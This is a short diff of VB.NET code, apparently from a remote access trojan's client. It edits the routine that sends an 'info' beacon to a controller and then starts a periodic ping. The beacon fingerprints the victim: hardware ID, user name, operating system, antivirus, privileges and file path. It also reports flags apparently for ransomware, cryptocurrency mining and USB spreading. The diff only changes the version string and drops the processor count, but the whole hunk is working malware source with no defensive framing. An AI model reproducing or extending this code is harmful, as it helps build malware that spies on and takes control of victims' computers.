@@ -108,9 +108,9 @@ re:
                 Alive = True
                 MS = New IO.MemoryStream
 
-                Send(String.Concat("info", SPL, C_ID.HWID, SPL, C_ID.UserName, SPL, "v0.1.8.4A", SPL, C_ID.MyOS, " ", C_ID.Bit, SPL,
+                Send(String.Concat("info", SPL, C_ID.HWID, SPL, C_ID.UserName, SPL, "v0.1.8.4B", SPL, C_ID.MyOS, " ", C_ID.Bit, SPL,
                                   C_ID.INDATE, SPL, C_ID.AV, SPL, C_ID.Rans, SPL, C_ID.XMR, SPL, C_ID.USBSP, SPL, "...", SPL, " ", SPL,
-                                  C_ID.Privileges.ToString, SPL, C_Settings.fullpath, SPL, Environment.ProcessorCount))
+                                  C_ID.Privileges.ToString, SPL, C_Settings.fullpath))
 
                 Dim T As New System.Threading.TimerCallback(AddressOf PING)
                 Tick = New System.Threading.Timer(T, Nothing, 0, 1)
